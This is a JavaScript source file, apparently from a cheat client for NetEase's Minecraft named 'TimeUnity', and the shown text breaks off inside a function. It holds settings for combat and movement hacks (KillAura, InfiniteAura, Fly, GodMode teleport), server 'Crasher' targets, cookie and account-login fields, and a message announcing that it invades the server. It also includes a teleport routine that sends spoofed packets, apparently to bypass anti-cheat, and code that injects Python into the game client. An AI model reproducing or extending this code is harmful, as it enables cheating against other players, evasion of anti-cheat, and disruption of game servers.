let ChestStealer_intercept = false;
let AttackLightning_Enabled = false;
let invManager_open_inventory = false;
let Critical_BJDMode = false;
let ChestStealer_SilentMode = true;
let invManager_Automatic = true;
let KillAura_Throwing = false;
let InfiniteAura_BJD_Mode_VL = false;
let AttackLightning = false;
let AttackLightning_Sound = true;
let ParticleBoom_ShowParticle = true;
let AcrossLevelTrade_Enabled = false;
let Anvil_NewLine_Enabled = false;
let AntiViewReset = true;
let Killnsult_BJDMode = true;
let BJDSpeed_Enabled = false;
let AutoGapple_IsActive = false;
let LobbyLockPlayer_Enabled = false;
let CustomName_Enabled = false;
let AutoBox_RenderShape = true;
let NoFall_BJDMode = false;
let BowTrack_Enabled = false;
let BowTrack_Player = true;
let BowTrack_Entity = false;
let Scaffold_RenderBox = false;
let InfiniteAura_BJDMode_Reconnect = false;
let DestroyBlockRender_Enabled = false;
let GhostMode_Enabled = false;
let AnvilDamage_Enabled = false;
let AccumDestroy_Enabled = false;
let FPS_Enabled = !_fs.exists(_app.getResource() + '/TimeUnity/ShowFPS.txt') || JSON.parse(_fs.read(_app.getResource() + '/TimeUnity/ShowFPS.txt').trim().toLowerCase());
let BackTrack_Tick = 0;
let BackTrack_Ticks = 0;
let FpsId = createText("", "Center", getScreenSizeData().screenWidth * 0.25, getScreenSizeData().screenHeight * 0.02);
const BrushData = "\n\n\n\n\n\n\n\n\n\n\n\n\n\n" + "".repeat(120);

function getRange(from, to) {
    if (!from || typeof from !== 'object' || !to || typeof to !== 'object') {
        return Infinity;
    }
    if (typeof from.x !== 'number' || typeof from.y !== 'number' || typeof from.z !== 'number') {
        return Infinity;
    }
    if (typeof to.x !== 'number' || typeof to.y !== 'number' || typeof to.z !== 'number') {
        return Infinity;
    }
    const dx = from.x - to.x;
    const dy = from.y - to.y;
    const dz = from.z - to.z;
    return Math.hypot(dx, dy, dz);
}
let self_id = {};
let PleaseCommand = "say 傻逼网易"
const InfiniteAura_Teleport = 40;
let InfiniteAura_MaxRange = 500;
let InfiniteAura_Interval = 10;
let InfiniteAura_Delay = 0;
let InfiniteAura_Timing = 0;
let InfiniteAura_counter = 0;
let InfiniteAura_TeleCount = 1;
let InfiniteAura_AtkStats = 1;
let MinYHitbox = 3;
let MinXHitbox = 3;
let InfiniteAura_BlackList = ["玩家A", "玩家B"];
let InfiniteAura_WhiteList = ["玩家A", "玩家B"];
let InfiniteAura_TeleportCounter = 0;
let MaxTarget = 3;
let KillAura_Range = 4.0;
let KillAura_CPS = 16;
let KillAura_FOV = 360.0;
let KillAura_MaxTarget = 1;
let KillAura_Delay1 = 0;
let KillAura_Delay2 = 0;
let GodMode_TP_height = 100000;
let AttackESP_length = 5;
let MegaTop_Speed = 15;
let MegaTop_yRot = 0;
let MoveAngle = 0;
let MoveSpeed = 0.1;
let MoveRadius = 3;
let Xsize = 0;
let Ysize = 0;
let Zsize = 0;
let Xoffset = 0;
let Yoffset = 0;
let Zoffset = 0;
let LockPosData = [];
let DelayTime = 2;
let DelayTiming = 0;
let FakeChatTiming = 0;
let FakeChat_Delay = 3;
let CookieLogin_Cookie = ""
let Spammer_Text = "人机";
let WelCome_Text = "§cTimeUnity入侵服务器"
let AttackParticle_Num = 5;
let AttackParticle_ID = 3;
let AttackParticle_Size = 1;
let self_motion = {};
let Speed = 0.6
let JumpHeight = 0.42
let angle = -1
let operation = ""
let Fly_SetUD = 1
let Fly_Speed = 1
let Fly_UD = Fly_SetUD
let at_max_text = 5;
let at_max_time = 20;
let at_max_len = 50;
let at_current = 0;
let last_msg_time = 0;
let invManager_Delay = 3;
let DropTiming = 0;
let AirHand_fov = 120;
let CmdBoost = 1;
let Spammer_CurrentLine = 0;
let KillCount = 0;
let self_rot = {};
let self_pos = {};
let self_prev = [];
let Amplitu = 3;
let BloodWarp = 5;
let TextPos = createText("", "Center", 100, 100);
let TextPosX = 108;
let TextPosY = 2;
let ticks = 0;
let firstBuiltY = null;
let intervalId = null;
let BringTP_Delay = 50;
let BloodTP_Pos = "0 0 0";
let Timer_speed = 20;
let AutoRC_Time = 0;
let dropitemData = ["diamond", "emerald"];
let ChestStealer_Timing = 0;
let ChestStealer_Delay = 3;
let AutoRC_Text = "127.0.0.1:10086";
let TickStop_Mode = 0;
let ChatLock_Name = ["不添加玩家"];
let Scaffold_Detection_Range = 1;
let TickStop_Timing = 0;
let TickStop_Delay = 0;
let Beacon_Speed = 0;
let CrystalAura_Range = 7;
let infiniteCookie_Cookie = null;
let UserList_Cookie = null;
let UserMarker = null;
let SpeedDestroy_Speed = 1;
let invManager_Number = 0;
let EnchantMod_Level = 10;
let PacketDestroy_Number = 20;
let ModPetData = "目前仅支持修改宠物狐狸";
let AutoCrasher_Text = "127.0.0.1:10086";
let BringTP_Pos = [0, 0, 0];
let Hammer_Enabled = false;
let Hammer_isAttack = false;
let Hammer_AttackTarget = null;
let Hammer_AttackHeight = 10;
let Hammer_ModifyPos = false;
let Critical_AttackTarget = null;
let Sauth_4399_User = null;
let Sauth_4399_Pass = null;
let Sauth_4399_Cookie = null;
let PacketSleep_Speed = 1;
let ModifyTime_WorldData = {};
let ModifyTime_Time = 20
let TeleMine_Packet = 1;
let Replication_Interval = 0;
let Replication_Delay = 3;
let Replication_Count = 64;
let PyRpcTube_Interval = 0;
let PyRpcTube_Delay = 1;
let Scaffold_length = 2;
let Scaffold_Speed = 0.33;
let KillAura_Undercut = 0;
let ChestStealer_Slot = 0;
let AutoBox_Range = 3;
let JumpSpeed_Speed = 0.28;
let JumpSpeed_Height = 0.40;
let FPSTimer = 20;
let AutoBox_History = [];
let KillAura_BlackList = [];
let KillAura_WhiteList = [];
let ServerChecker_Server = "";
let ServerChecker_UID = "123456";
let AntiVoid_Speed = 1;
let AntiVoid_Pos = {};
let BJDFly_Pos = [];
let Blink_Pos = [];
let BJDFly_Speed = 1;
let BJDFly_Packet = 1;
let AutoDestroyBed_Range = 3;
let AutoDestroyBed_Data = 0;
let AutoBox_Data = 0;
let CustomSkyValue = 0;
let Blink_Speed = 20;
let Hammer_AttackStep = 1;
let GodMode_TP_Vertical = 30;
let GodMode_Teleport = 1;
let NoOnlineKick_LobbyGame = null;
let self_Health = 0;
let AutoGapple_Slot = null;
let ChestStealer_ContainerData = [];
let InputVector = "";
let RGBA = [];
let Debug_Enabled = false;
let AutoGapple_isEating = false;
let AutoGapple_EatStartTime = 0;
let AutoGapple_EatingEndTime = 2500;
let AutoGapple_Health = 10;
let invManager_SlotQuantity = 1;
let invManager_DropQuantity = 1;
let TransferPlayer_Timing = 0;
let TransferPlayer_CycleTP = false;
let ParticleBoom_Quantity = 20;
let InfiniteAura_RewriteAttackPos = null;
let TransferMenuOpen = false;
let RpcQueue = [];
let CurrentTargetId = "-124554051277";
let IsRpcReady = true;
let EnableTeleport = true;
let EnableCoordinatesMsg = false;
let EnableTeleportTip = true;
let EnableOffset = false;
let EnableLogToFile = false;
let OffsetX = 0;
let OffsetY = 1;
let OffsetZ = 0;
let CachedPlayerList;
let IsMenuInitialized = true;
let CyclePlayerList = [];
let Global_InfiniteAura_PlayerList = [];
let Global_InfiniteAura_IsMenuInitialized = true;
let Global_InfiniteAura_TargetIds = [];
let Global_InfiniteAura_Delay = 3;
let Global_InfiniteAura_Timing = 0;
let Global_InfiniteAura_TeleCount = 2;
let Global_InfiniteAura_AttackCount = 1;
let LocalPlayerName = "";
let ParticleBoom_PlayerList = [];
let ParticleBoom_IsMenuInitialized = true;
let ParticleBoom_TargetIds = [];
const ParticleBoom_PlayerMoveData = {};
let InfiniteAura_PacketPos = null;
let SilentRot_data = null;
let Critical_SilentRot = null;
let AutoFood_Health = 12;
let CampersAura_Speed = 170;
let PlayerAuthInput_ClientTick = 0;
let Intercepted_ClientTicks = [];
let ContainerContent = null;
let ChestStealer_Quantity = 1;
let KillAura_LastThrowTime = 0;
let InfiniteAura_BJD_Mode_VLCount = 0;
let KillAura_Throwing_Distance = 6.00;
let BJDSpeed_Speed = 0.30;
let LobbyLockPlayer_UID = "123456";
let ContainerOpenQueue = [];
let Pending_AutoBox = null;
let invManager_Intercept_Open = false;
let invManager_Intercept_Time = Date.now();
let Crasher_Count = 0;
let SyncSkinData = null;
let Crasher_Delay = 50;
let ItemStackRequest_RequestId = -1;
let CustomName_Content = "";
let Scaffold_Shapes = [];
let BJDSpeed_Timer = 20.0;
let DestroyBlocks = null;
let DestroyBlockRender_Shape = null;
let DestroyBlockRender_CurrentPos = null;
let DestroyBlockRender_StartTime = 0;
let DestroyBlockRender_Duration = 0;
let AutoDestroyBed_IsMining = false;
let AutoDestroyBed_MiningTarget = null;
let AutoDestroyBed_Progress = 0;
let AutoDestroyBed_MiningSpeed = 0;
let AnvilDamage_value = 5;
let AccumDestroy_Tick = 0;
const UI_Config = {
    "enable": true
};
let FogColorConfig = {
    Progress: 0,
    Color1: {
        r: 150,
        g: 50,
        b: 200
    },
    Color2: {
        r: 200,
        g: 100,
        b: 150
    },
    Speed: 5,
    FogRange: 30.0
};
let TU_Bind_Key = {};
let UI_Version = {};
let TransferPlayer_id = null;
let invManager_TaskQueue = [];
let PlayerMap = [];
let PlayerAuthInput_Pos = {};
let PlayerAuthInput_Rot = {};
let LocalRuntimeId = "";
let ContainerOpenState = "";
let BuildData = ["weathered_copper", "cobbled_deepslate_slab", "blackstone_stairs", "warped_fence", "cocoa", "green_candle", "wheat", "sculk_sensor", "oxidized_double_cut_copper_slab", "unpowered_repeater", "powered_comparator", "cracked_polished_blackstone_bricks", "noteblock", "diamond_block", "red_candle", "fire", "lit_redstone_ore", "lime_concrete", "smithing_table", "crimson_oak_planks", "cave_vines_body_with_berries", "sandstone", "pointed_dripstone", "orange_shulker_box", "melon_stem", "bamboo_mosaic_stairs", "brain_coral", "sculk", "chorus_flower", "green_shulker_box", "frog_spawn", "dark_oak_hanging_sign", "gold_block", "chest", "chain", "light_blue_glazed_terracotta", "allow", "waterlily", "purple_carpet", "warped_door", "calcite", "crimson_standing_sign", "darkoak_wall_sign", "unpowered_comparator", "medium_amethyst_bud", "element_86", "element_87", "element_84", "element_85", "element_82", "element_83", "element_80", "element_81", "element_88", "element_89", "element_99", "element_98", "element_91", "element_90", "element_93", "element_92", "element_95", "element_94", "element_97", "element_96", "element_28", "element_29", "element_20", "element_21", "element_22", "element_23", "element_24", "element_25", "element_26", "element_27", "element_39", "element_38", "element_33", "element_32", "element_31", "element_30", "element_37", "element_36", "element_35", "element_34", "element_11", "element_10", "element_13", "element_12", "element_15", "element_14", "element_17", "element_16", "element_19", "element_18", "element_64", "element_65", "element_66", "element_67", "element_60", "element_61", "element_62", "element_63", "element_68", "element_69", "element_77", "element_76", "element_75", "element_74", "element_73", "element_72", "element_71", "element_70", "element_79", "element_78", "element_48", "element_49", "element_42", "element_43", "element_40", "element_41", "element_46", "element_47", "element_44", "element_45", "element_59", "element_58", "element_55", "element_54", "element_57", "element_56", "element_51", "element_50", "element_53", "element_52", "carrots", "slime", "yellow_shulker_box", "nether_sprouts", "waxed_exposed_double_cut_copper_slab", "smooth_sandstone_stairs", "spruce_trapdoor", "stone_block_slab", "light_weighted_pressure_plate", "cauldron", "target", "sculk_catalyst", "deny", "dirt", "dropper", "polished_blackstone", "black_glazed_terracotta", "pink_candle_cake", "torch", "cherry_standing_sign", "polished_blackstone_brick_stairs", "black_carpet", "birch_standing_sign", "yellow_carpet", "warped_hyphae", "repeating_command_block", "end_stone", "exposed_double_cut_copper_slab", "cave_vines", "activator_rail", "dispenser", "unknown", "spruce_standing_sign", "cake", "clay", "polished_deepslate_slab", "waxed_cut_copper_stairs", "nether_brick_fence", "waxed_exposed_copper", "lit_furnace", "nether_brick_stairs", "nether_wart", "deepslate_brick_wall", "coal_block", "wall_banner", "deepslate_diamond_ore", "magenta_candle_cake", "coral_block", "white_carpet", "jungle_door", "piston_arm_collision", "dark_oak_fence_gate", "exposed_copper", "cherry_wall_sign", "pink_concrete", "cobbled_deepslate_wall", "netherite_block", "end_portal_frame", "iron_door", "crimson_door", "beacon", "mob_spawner", "polished_deepslate_stairs", "bell", "jigsaw", "lime_glazed_terracotta", "suspicious_sand", "stripped_mangrove_log", "black_concrete", "suspicious_gravel", "cobbled_deepslate_stairs", "blue_wool", "moss_block", "waxed_exposed_cut_copper", "acacia_standing_sign", "exposed_cut_copper", "deepslate_brick_stairs", "cherry_pressure_plate", "exposed_cut_copper_stairs", "gray_candle_cake", "cyan_candle_cake", "waxed_oxidized_double_cut_copper_slab", "orange_candle", "cherry_trapdoor", "verdant_froglight", "red_candle_cake", "sticky_piston", "sticky_piston_arm_collision", "warped_stairs", "magenta_concrete", "hay_block", "polished_blackstone_stairs", "border_block", "stone_pressure_plate", "crimson_fungus", "stripped_crimson_hyphae", "unlit_redstone_torch", "light_blue_concrete", "bone_block", "ender_chest", "brown_wool", "info_update2", "jungle_pressure_plate", "bamboo_hanging_sign", "stripped_dark_oak_log", "decorated_pot", "brick_block", "lodestone", "cobbled_deepslate", "pitcher_plant", "mangrove_hanging_sign", "tinted_glass", "deadbush", "obsidian", "cherry_fence", "warped_standing_sign", "grass_block", "twisting_vines", "stripped_cherry_wood", "cyan_carpet", "raw_gold_block", "podzol", "pink_wool", "golden_rail", "structure_block", "purple_concrete", "crimson_double_slab", "lightning_rod", "warped_oak_planks", "cherry_door", "hanging_roots", "light_gray_wool", "azalea_leaves", "deepslate_bricks", "lit_blast_furnace", "ancient_debris", "pumpkin", "reeds", "stripped_spruce_log", "dead_fire_coral", "bamboo_pressure_plate", "mangrove_slab", "brown_glazed_terracotta", "mangrove_stairs", "green_concrete", "bamboo_trapdoor", "bamboo_block", "iron_trapdoor", "yellow_glazed_terracotta", "end_gateway", "leaves2", "light_gray_shulker_box", "snow_layer", "mud_brick_double_slab", "element_110", "element_111", "element_112", "element_113", "element_114", "element_115", "element_116", "element_117", "element_118", "element_103", "element_102", "element_101", "element_100", "element_107", "element_106", "element_105", "element_104", "element_109", "element_108", "mangrove_standing_sign", "oak_fence", "hard_stained_glass", "warped_wall_sign", "conduit", "deepslate_brick_slab", "magenta_candle", "silver_glazed_terracotta", "warped_fungus", "mangrove_trapdoor", "double_cut_copper_slab", "lapis_ore", "beehive", "large_amethyst_bud", "warped_fence_gate", "mangrove_oak_planks", "deepslate_coal_ore", "horn_coral", "bamboo_oak_planks", "orange_concrete", "deepslate_tile_double_slab", "stained_glass", "smoker", "dark_oak_stairs", "dark_oak_pressure_plate", "red_sandstone", "lime_carpet", "waxed_copper", "chorus_plant", "honey_block", "water", "stripped_birch_log", "trapped_chest", "amethyst_cluster", "info_update", "torchflower", "skull", "nether_gold_ore", "waxed_weathered_copper", "jungle_wall_sign", "soul_soil", "soul_sand", "orange_glazed_terracotta", "green_wool", "wall_sign", "red_glazed_terracotta", "orange_carpet", "piston", "mycelium", "dried_kelp_block", "barrier", "purpur_stairs", "bamboo_mosaic_double_slab", "seagrass", "light_gray_carpet", "chemical_heat", "mangrove_fence", "monster_egg", "chiseled_polished_blackstone", "wooden_pressure_plate", "quartz_bricks", "cyan_glazed_terracotta", "flowering_azalea", "black_shulker_box", "candle", "stonebrick", "magenta_wool", "cobblestone", "budding_amethyst", "stone", "light_gray_concrete", "deepslate_iron_ore", "oxidized_cut_copper_stairs", "waxed_cut_copper_slab", "smooth_quartz_stairs", "brown_mushroom_block", "mangrove_wall_sign", "double_wooden_slab", "copper_block", "nether_brick", "blackstone_wall", "honeycomb_block", "deepslate_brick_double_slab", "coral_fan_dead", "sweet_berry_bush", "blue_candle", "standing_banner", "mangrove_wood", "bamboo_slab", "grass_path", "prismarine_stairs", "red_mushroom", "prismarine_bricks_stairs", "camera", "dragon_egg", "lime_candle_cake", "cherry_oak_planks", "deepslate_tile_stairs", "spruce_wall_sign", "mossy_cobblestone_stairs", "birch_log", "chemistry_table", "crimson_hanging_sign", "warped_trapdoor", "crimson_pressure_plate", "pink_shulker_box", "flowing_water", "acacia_pressure_plate", "blue_shulker_box", "waxed_cut_copper", "coral_fan_hang3", "coral_fan_hang2", "double_stone_block_slab", "furnace", "black_candle", "respawn_anchor", "red_sandstone_stairs", "birch_door", "cherry_hanging_sign", "bamboo_double_slab", "mangrove_roots", "lantern", "wood", "black_wool", "moss_carpet", "light_gray_candle_cake", "smooth_red_sandstone_stairs", "standing_sign", "bubble_column", "polished_andesite_stairs", "wooden_slab", "oxidized_cut_copper_slab", "farmland", "lit_deepslate_redstone_ore", "copper_ore", "frame", "daylight_detector", "yellow_candle_cake", "cut_copper", "stripped_jungle_log", "turtle_egg", "mud_brick_stairs", "reserved6", "crimson_stairs", "light_gray_candle", "glass", "bamboo_sapling", "vine", "cartography_table", "powder_snow", "acacia_wall_sign", "spruce_stairs", "oak_log", "client_request_placeholder_block", "spruce_door", "warped_nylium", "birch_fence", "blackstone_slab", "sapling", "quartz_block", "bookshelf", "white_glazed_terracotta", "crying_obsidian", "oxidized_copper", "cave_vines_head_with_berries", "pearlescent_froglight", "coral_fan_hang", "big_dripleaf", "end_bricks", "diorite_stairs", "raw_copper_block", "polished_blackstone_pressure_plate", "chain_command_block", "acacia_fence_gate", "cracked_nether_bricks", "light_blue_wool", "colored_torch_rg", "colored_torch_bp", "waxed_weathered_cut_copper", "glow_lichen", "stripped_bamboo_block", "stone_stairs", "cherry_slab", "exposed_cut_copper_slab", "white_shulker_box", "stripped_cherry_log", "deepslate_redstone_ore", "white_candle", "andesite_stairs", "cyan_wool", "acacia_log", "tuff", "crimson_fence_gate", "stained_glass_pane", "green_glazed_terracotta", "micro_block", "birch_hanging_sign", "packed_mud", "packed_ice", "end_rod", "grindstone", "deepslate", "double_plant", "crimson_fence", "waxed_double_cut_copper_slab", "crimson_nylium", "lapis_block", "emerald_block", "yellow_flower", "magma", "bedrock", "concrete_powder", "purple_glazed_terracotta", "warped_roots", "gray_concrete", "fire_coral", "end_brick_stairs", "jungle_trapdoor", "dead_brain_coral", "sand", "snow", "crimson_wall_sign", "light_blue_candle", "acacia_door", "crimson_roots", "lever", "birch_stairs", "gilded_blackstone", "infested_deepslate", "sniffer_egg", "spruce_hanging_sign", "bamboo_door", "weathered_cut_copper_slab", "torchflower_crop", "warped_double_slab", "green_carpet", "ochre_froglight", "detector_rail", "purple_shulker_box", "red_carpet", "rail", "cherry_fence_gate", "polished_deepslate", "cherry_double_slab", "hardened_clay", "purpur_block", "dark_oak_log", "dirt_with_roots", "birch_fence_gate", "chiseled_nether_bricks", "bamboo_fence", "hopper", "invisible_bedrock", "redstone_block", "netherrack", "lime_wool", "weathered_double_cut_copper_slab", "waxed_oxidized_cut_copper_stairs", "sea_lantern", "coal_ore", "moving_block", "brown_shulker_box", "cobblestone_wall", "brown_mushroom", "jungle_fence", "reinforced_deepslate", "element_8", "element_9", "element_2", "element_3", "element_0", "element_1", "element_6", "element_7", "element_4", "element_5", "purple_wool", "trip_wire", "dark_oak_fence", "pink_glazed_terracotta", "trapdoor", "cherry_stairs", "potatoes", "amethyst_block", "cherry_leaves", "lectern", "command_block", "stonecutter", "stripped_warped_hyphae", "soul_lantern", "leaves", "brown_carpet", "darkoak_standing_sign", "muddy_mangrove_roots", "small_dripleaf_block", "black_candle_cake", "soul_torch", "spruce_log", "polished_deepslate_double_slab", "warped_pressure_plate", "cherry_wood", "purple_candle_cake", "deepslate_emerald_ore", "waxed_weathered_double_cut_copper_slab", "birch_pressure_plate", "dead_bubble_coral", "gray_glazed_terracotta", "dark_oak_door", "blue_ice", "netherreactor", "soul_fire", "spruce_fence_gate", "barrel", "blackstone", "brick_stairs", "sculk_vein", "hard_glass", "bamboo_stairs", "acacia_trapdoor", "spruce_fence", "diamond_ore", "pink_candle", "polished_blackstone_bricks", "lime_candle", "light_blue_candle_cake", "acacia_fence", "calibrated_sculk_sensor", "chiseled_deepslate", "waxed_exposed_cut_copper_stairs", "lit_pumpkin", "deepslate_tile_wall", "lit_smoker", "crimson_hyphae", "bee_nest", "waxed_oxidized_cut_copper_slab", "brown_candle", "jukebox", "basalt", "coral_fan", "blackstone_double_slab", "polished_blackstone_wall", "jungle_standing_sign", "quartz_stairs", "soul_campfire", "birch_wall_sign", "wither_rose", "polished_granite_stairs", "double_stone_block_slab4", "double_stone_block_slab3", "double_stone_block_slab2", "observer", "birch_trapdoor", "bamboo", "cactus", "smooth_stone", "dead_horn_coral", "portal", "stripped_mangrove_wood", "brown_candle_cake", "stonecutter_block", "gray_shulker_box", "undyed_shulker_box", "composter", "cracked_deepslate_bricks", "red_nether_brick", "orange_candle_cake", "brown_concrete", "nether_wart_block", "pink_carpet", "warped_wart_block", "redstone_ore", "azalea", "azalea_leaves_flowered", "polished_diorite_stairs", "sea_pickle", "flowing_lava", "bamboo_mosaic", "warped_slab", "warped_stem", "redstone_wire", "polished_basalt", "blue_glazed_terracotta", "crimson_trapdoor", "small_amethyst_bud", "sandstone_stairs", "cut_copper_stairs", "polished_blackstone_brick_double_slab", "weathered_cut_copper_stairs", "fence_gate", "stained_hardened_clay", "red_flower", "yellow_candle", "cobbled_deepslate_double_slab", "stripped_oak_log", "light_blue_shulker_box", "blue_carpet", "mangrove_propagule", "dead_tube_coral", "chiseled_bookshelf", "warped_hanging_sign", "scaffolding", "mangrove_log", "light_block", "mangrove_double_slab", "enchanting_table", "beetroot", "powered_repeater", "cyan_shulker_box", "weathered_cut_copper", "wooden_door", "lit_redstone_lamp", "crafting_table", "stone_brick_stairs", "polished_blackstone_brick_wall", "structure_void", "cyan_candle", "mud_brick_wall", "polished_blackstone_double_slab", "oak_stairs", "red_mushroom_block", "cherry_sapling", "yellow_wool", "loom", "lava", "bamboo_wall_sign", "mossy_stone_brick_stairs", "magenta_shulker_box", "orange_wool", "stripped_warped_stem", "spruce_pressure_plate", "flower_pot", "bamboo_mosaic_slab", "oxidized_cut_copper", "cherry_log", "red_shulker_box", "pitcher_crop", "deepslate_tile_slab", "oak_hanging_sign", "smooth_basalt", "dark_prismarine_stairs", "cyan_concrete", "polished_blackstone_slab", "gold_ore", "acacia_hanging_sign", "redstone_lamp", "glowingobsidian", "kelp", "glass_pane", "white_concrete", "mud", "ice", "mangrove_leaves", "daylight_detector_inverted", "bed", "air", "bamboo_standing_sign", "oak_planks", "normal_stone_stairs", "red_wool", "red_concrete", "deepslate_tiles", "fletching_table", "crimson_stem", "crimson_slab", "tallgrass", "shroomlight", "glow_frame", "magenta_glazed_terracotta", "gray_wool", "lime_shulker_box", "deepslate_gold_ore", "cracked_deepslate_tiles", "mossy_cobblestone", "acacia_stairs", "jungle_fence_gate", "waxed_weathered_cut_copper_stairs", "jungle_hanging_sign", "mangrove_door", "jungle_log", "white_candle_cake", "mangrove_pressure_plate", "gray_carpet", "end_portal", "emerald_ore", "candle_cake", "stone_block_slab4", "stone_block_slab3", "stone_block_slab2", "waxed_oxidized_cut_copper", "light_blue_carpet", "melon_block", "heavy_weighted_pressure_plate", "waxed_exposed_cut_copper_slab", "green_candle_cake", "tube_coral", "hard_stained_glass_pane", "campfire", "granite_stairs", "cut_copper_slab", "bamboo_fence_gate", "jungle_stairs", "tripwire_hook", "mod_ore", "blue_candle_cake", "polished_blackstone_brick_slab", "sponge", "mud_brick_slab", "pink_petals", "gravel", "iron_bars", "iron_block", "spore_blossom", "prismarine", "magenta_carpet", "deepslate_lapis_ore", "gray_candle", "frosted_ice", "mangrove_fence_gate", "hard_glass_pane", "blue_concrete", "weeping_vines", "blast_furnace", "deepslate_copper_ore", "bubble_coral", "white_wool", "polished_deepslate_wall", "quartz_ore", "red_nether_brick_stairs", "dark_oak_trapdoor", "stripped_crimson_stem", "sculk_shrieker", "glowstone", "anvil", "mud_bricks", "pumpkin_stem", "yellow_concrete", "brewing_stand", "waxed_weathered_cut_copper_slab", "dripstone_block", "raw_iron_block", "carved_pumpkin", "stripped_acacia_log", "iron_ore", "waxed_oxidized_copper", "purple_candle"];
if (_fs.exists(_app.getResource() + '/TimeUnity/ModuleTip.json')) {
    ({
            Enabled: ModuleTip_Enabled,
            MessageTip: ModuleTip_MessageTip,
            GUITip: ModuleTip_GUITip
        } =
        JSON.parse(_fs.read(_app.getResource() + '/TimeUnity/ModuleTip.json')));
}
let CameraX = 0;
let CameraY = 0;
let CameraZ = 0;
let currentPos = {
    x: 0,
    y: 1.5,
    z: 0
};
const DrawParticle = (id, pos, size, num) => {
    const centerY = pos.y + (size.y / 2) + 0.3;
    const radius = (size.x / 2) + 0.7;
    for (let i = 0; i < (num * 20); i++) {
        const u = Math.random();
        const v = Math.random();
        const theta = u * 2.0 * Math.PI;
        const phi = Math.acos(2.0 * v - 1.0);
        const r = Math.sqrt(Math.random()) * radius;
        const x = pos.x + r * Math.sin(phi) * Math.cos(theta);
        const y = centerY + r * Math.cos(phi);
        const z = pos.z + r * Math.sin(phi) * Math.sin(theta);
        addParticle(Number(id), x, y, z, x, y, z, 1, false)
    }
}
const getHorizontalDistance = (p1, p2) => Math.hypot(p1.x - p2.x, p1.z - p2.z);
const calAngle = (hor, vec) => {
    const v = 100;
    const g = 16;
    const angle_triangle = Math.atan(-vec / hor);
    const distance = Math.hypot(hor, vec);
    const theta = Math.atan((distance * g) / (2 * v * v));
    return -((theta + angle_triangle) * 180 / Math.PI);
};

const getPlayerAngle = (mid, target, mode) => {
    const target_pos = typeof target !== "string" ? target : getEntityPos(target);
    const self_pos = typeof mid !== "string" ? mid : getEntityPos(mid);
    if (!target_pos || !self_pos) return Infinity;
    const rot = getEntityRot(mid);
    const dx = target_pos.x - self_pos.x;
    const dy = self_pos.y - target_pos.y;
    const dz = target_pos.z - self_pos.z;
    const level = Math.sqrt(dx * dx + dz * dz);
    const angle_h = Math.atan2(dz, dx) * 180 / Math.PI;
    if (mode === "yaw_pos") {
        return (angle_h > -180 && angle_h <= 90) ? (angle_h + 90) : (angle_h - 270);
    }
    if (mode === "yaw_rot") {
        const yaw_pos = (angle_h > -180 && angle_h <= 90) ? (angle_h + 90) : (angle_h - 270);
        return yaw_pos - rot.yaw;
    }
    if (mode === "pitch_pos") {
        return Math.atan2(dy, level) * 180 / Math.PI;
    }
    if (mode === "pitch_rot") {
        const pitch_pos = Math.atan2(dy, level) * 180 / Math.PI;
        return pitch_pos - rot.pitch;
    }
    return Infinity;
};

const getEntityBlockPos = (id) => {
    const pos = getEntityPos(id)
    let y = (id === self_id) ? Math.floor(pos.y) - 1 : Math.floor(pos.y)
    return {
        x: Math.floor(pos.x),
        y,
        z: Math.floor(pos.z)
    }
} // 获取玩家方块坐标

const getLocalUID = (callback) => {
    curl_post_game_api("https://g79obtcore.minecraft.cn:8443/pe-user-detail/get", "{}", function(code, response, headers) {
        try {
            const Data = JSON.parse(response);
            if (Data.entity && Data.entity.entity_id) {
                callback(null, Data.entity.entity_id);
            } else {
                callback(new Error("UID not found in response"));
            }
        } catch (error) {
            callback(error);
        }
    });
}

function join_world(server_id, ip, port) {
    if (!_app.isInGame()) {
        _app.evalPython(`
import realms_main
from gui_2d.consts import InGameType
import mc_game_ctrl
from gui_2d.utils import util

host_dict = {
    'BGP': '${ip}',
    'ISP': '${ip}'
}
port_dict = {
    'BGP': ${port},
    'ISP': ${port}
}

game_info = {
    'gameType': InGameType.LobbyGame,
    'res_id': '${server_id}',
    'id': '${server_id}'
}
mc_game_ctrl.instance.setCurGameInfo(game_info)
util.add_play_game_record(game_info)
realms_main.join_lobby_game(host_dict, port_dict)
`);
    } else {
        _app.executePluginCommand(`/ww server ${ip} ${port}`);
        _app.evalPython(`
import realms_main
from gui_2d.consts import InGameType
import mc_game_ctrl
from gui_2d.utils import util

host_dict = {
    'BGP': '${ip}',
    'ISP': '${ip}'
}
port_dict = {
    'BGP': ${port},
    'ISP': ${port}
}

game_info = {
    'gameType': InGameType.LobbyGame,
    'res_id': '${server_id}',
    'id': '${server_id}'
}
mc_game_ctrl.instance.setCurGameInfo(game_info)
util.add_play_game_record(game_info)
realms_main.join_lobby_game(host_dict, port_dict)
`);
    }
}

const calDisplacement = (length, pos, rot) => {
    if (length === 0) return pos
    let isLow = (length < 0) ? true : false
    let {
        yaw,
        pitch
    } = rot
    if (yaw > 180) yaw = yaw - 360
    if (yaw < -180) yaw = 360 + yaw
    if (pitch < -90) pitch = -90
    if (pitch > 90) pitch = 90
    length = Math.abs(length);
    const a = yaw * Math.PI / 180;
    const b = pitch * Math.PI / 180;
    let y = (pitch != 0) ? (Math.sin(b) * length) : 0
    let l = (pitch != 0) ? (y / Math.tan(b)) : length
    let isLow2 = l < 0
    l = Math.abs(l)
    const cos_d = Math.cos(a) * l
    const sin_d = Math.sin(a) * l
    let x = -Math.sin(a) * l;
    let z = Math.cos(a) * l;
    if (isLow || isLow2) {
        x = -x;
        if (!isLow2) y = -y;
        z = -z;
    }
    return {
        x: pos.x + x,
        y: pos.y - y,
        z: pos.z + z
    };
}; // 获取相对坐标

const checkWall = (pos, pos2, enable, p1_offset = 0, p2_offset = 0) => {
    if (!enable) return true;
    const p1 = {
        x: pos.x,
        y: pos.y + p1_offset,
        z: pos.z
    };
    const p2 = {
        x: pos2.x,
        y: pos2.y + p2_offset,
        z: pos2.z
    };
    const yaw = getPlayerAngle(p1, p2, "yaw_pos");
    const pitch = -getPlayerAngle(p1, p2, "pitch_pos");
    const distance = getRange(p1, p2);
    let nowall = true;
    for (let i = 0; i < distance; i += 0.5) {
        const p = calDisplacement(i, p1, {
            yaw,
            pitch
        });
        const block = getBlock(p.x, p.y, p.z);
        if (block.namespace !== "minecraft:air" && block.namespace !== "minecraft:water") {
            nowall = false;
            break;
        }
    }
    return nowall;
};

function Bypass_setPos(x, y, z) {
    const steps = Math.ceil(Math.sqrt((x - self_pos.x) ** 2 + (y - self_pos.y) ** 2 + (z - self_pos.z) ** 2) / 30);
    if (steps === 0) {
        sendPlayerAuthInput({
            pos: {
                x: x,
